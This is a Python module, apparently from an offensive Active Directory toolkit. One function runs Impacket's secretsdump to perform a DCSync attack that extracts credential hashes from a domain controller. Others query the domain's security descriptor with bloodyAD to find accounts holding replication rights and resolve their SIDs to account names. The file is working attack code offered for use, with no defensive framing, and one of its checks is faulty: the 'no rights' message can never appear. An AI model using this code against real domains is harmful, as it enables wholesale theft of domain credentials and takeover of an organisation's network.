import subprocess


DCSYNC_GUID = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"

def domain_to_dn(domain):
    return ",".join(f"DC={part}" for part in domain.split("."))

def run_dcsync(domain, username, password, target):
    credential = f"{domain}/{username}:{password}@{target}"
    output = subprocess.run(
        ["python3", "app/utils/tools/secretsdump.py", credential],
        capture_output=True,
        text=True,
    )
    results = []

    if output.returncode != 0 and not output.stdout.strip():
        return ["DCSync failed. Verify target reachability and credentials."]

    for line in output.stdout.splitlines():
        parts = line.split(":")
        if len(parts) > 3 and parts[1].isdigit():
            results.append(line)

    if not results:
        return ["DCSync ran but no credential material was returned."]

    return results


def convert_sid(domain, username, password, host, sid):
    output = subprocess.run(
        ["bloodyad", "-d", domain, "-u", username, "-p", password, "-H", host, "get", "object", sid, "--attr", "sAMAccountName"],
        capture_output=True,
        text=True,
    )

    if output.returncode != 0 or not output.stdout:
        return None

    clean = output.stdout.strip().splitlines()
    if len(clean) > 1:
        return clean[1]

    return clean[0] if clean else None


def check_dcsync(domain, username, password, host):
    dn = domain_to_dn(domain)

    output = subprocess.run(
        ["bloodyad","-d",domain,"-u",username,"-p",password,"-H",host,"get","object",dn,"--attr","nTSecurityDescriptor",],
        capture_output=True,
        text=True,
    )

    if output.returncode != 0:
        return ["DCSync check failed. Verify target reachability and credentials."]

    data = output.stdout.replace(")(", ")\n(")
    entry = []
    for line in data.splitlines():
        if DCSYNC_GUID in line:
            parts = line.split(";")
            if len(parts) > 5:
                sid = parts[5]
                entry.append(sid[:-1])

    sam_account_names = []
    for sid in entry:
        sam_account_names.append(convert_sid(domain, username, password, host, sid))

    result = ["Account(s) with DCSync rights:", "-----------------------------"]
    for name in sam_account_names:
        if not name:
            continue
        try:
            if "sAMAccountName: " in name:
                _, value = name.split(": ", 1)
                result.append(value)
        except ValueError:
            result.append(name)

    if not result:
        return ["User does NOT have DCSync rights."]

    return result
